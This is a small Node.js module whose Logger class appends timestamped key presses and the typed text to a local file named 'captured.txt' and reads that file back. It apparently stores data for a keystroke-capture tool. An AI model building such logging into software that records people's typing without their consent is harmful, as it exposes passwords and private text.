const fs = require("fs");
const path = require("path");

class Logger {
    constructor() {
        this.dataDir = path.join(__dirname, "..", "data");
        this.logFile = path.join(this.dataDir, "captured.txt");
        
        if (!fs.existsSync(this.dataDir)) fs.mkdirSync(this.dataDir);
        if (!fs.existsSync(this.logFile)) fs.writeFileSync(this.logFile, "");
    }

    formatKey(key) {
        if (key === " ") return "[SPACE]";
        if (key === "\n") return "[ENTER]";
        if (key === "\t") return "[TAB]";
        return key;
    }

    log(event) {
        const time = new Date().toLocaleTimeString();
        const key = this.formatKey(event.key);
        const text = event.current_text || event.text || "";
        
        const line = `[${time}] Key: ${key.padEnd(8)} | Text: "${text}"\n`;
        fs.appendFileSync(this.logFile, line);
        
        return { time, key, text };
    }

    getHistory() {
        return fs.existsSync(this.logFile) 
            ? fs.readFileSync(this.logFile, "utf8") 
            : "";
    }
}

module.exports = Logger;